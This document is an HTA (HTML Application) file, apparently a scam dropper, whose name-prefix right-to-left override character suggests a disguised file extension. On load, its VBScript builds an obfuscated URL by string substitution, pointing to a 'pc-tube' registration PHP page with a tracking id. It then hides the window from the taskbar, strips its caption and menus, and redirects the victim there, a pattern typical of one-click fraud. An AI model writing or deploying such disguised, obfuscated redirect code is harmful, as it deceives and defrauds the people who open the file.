%E2%80%AD<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title></title>
<Script Language="VBScript">
sub checkSilverLight(mv)
	strHttp = "h" & "^*[][]"
	strPara = "()cccid="
	strPara = strPara & "90616631"
	strPara = strPara & "&mv=" 
	strPara = strPara & " 4"
	strURL = strHttp
	'strURL = strHttp & "douga329|info[]pc-tube[]pc2test"	'@@@@@@@@
	strURL = strHttp & "douga329|info[]pc-tube[]pc2"
	strURL = strURL & "[]reg1_1403191413"
	strURL = strURL & "|"
	strURL = strURL & "php"
	strURL = strURL & strPara
	strURL = Replace(strURL, "^", "ttp")
	strURL = Replace(strURL, "*", ":")
	strURL = Replace(strURL, "[]", "/")
	strURL = Replace(strURL, "|", ".")
	strURL = Replace(strURL, "()", "?")

	Location.Href = strURL
end sub

on error resume next
winwidth = 600
winheight = 400
'
window.resizeTo winwidth,winheight
positionX = ( screen.availWidth - winwidth ) / 2
positionY = ( screen.availHeight - winheight ) / 2
window.moveTo positionX, positionY

sub window_onLoad()
checkSilverLight "90616631"
end sub

</Script>
</head>
<body>
<HTA:APPLICATION 
    APPLICATIONNAME="90616631"
    ID="90616631"
    VERSION="1.0"
    SINGLEINSTANCE="yes"
    SHOWINTASKBAR="no"
    NAVIGABLE="yes"
    WINDOWSTATE="normal"
    BORDER="none"
    INNERBORDER="no"
    BORDERSTYLE="normal"
    CONTEXTMENU="no"
    SELECTION="no"
    SCROLL="no"
    SCROLLFLAT="no"
    CAPTION="no"
    ICON=""
    SYSMENU="no"
    MAXIMIZEBUTTON="no"
    MINIMIZEBUTTON="no"
/>
STEP1 - 90616631
</html>
